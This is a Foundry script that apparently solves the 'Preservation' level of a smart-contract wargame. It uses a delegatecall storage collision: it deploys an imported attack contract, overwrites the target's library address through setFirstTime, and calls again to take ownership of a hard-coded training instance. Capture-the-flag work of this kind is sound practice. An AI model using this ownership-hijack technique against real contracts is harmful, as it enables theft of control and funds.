// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/level16.sol";
import "../levels/level16.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract PreserveHack is Script
{
    function run() external
    {
        vm.startBroadcast(vm.envUint('PRIVATE_KEY'));
        
        PreservationHack preservationHackInstance = new PreservationHack();

        Preservation preservation = Preservation(0x5912bf43d7664e75bED4c22109a036a6272479ef);

        address addr = address(preservationHackInstance);
        console.log("Preservation Hack Address is", preservation.timeZone1Library());
        console.log("Owner address", preservation.owner());

        preservation.setFirstTime(uint256(uint160(addr)));
        console.log("Preservation Hack Address is", preservation.timeZone1Library());

        preservation.setFirstTime(3895353);
        console.log("Preservation Hack Address is", preservation.timeZone1Library());
        console.log("Owner address", preservation.owner());

        vm.stopBroadcast();
    }
}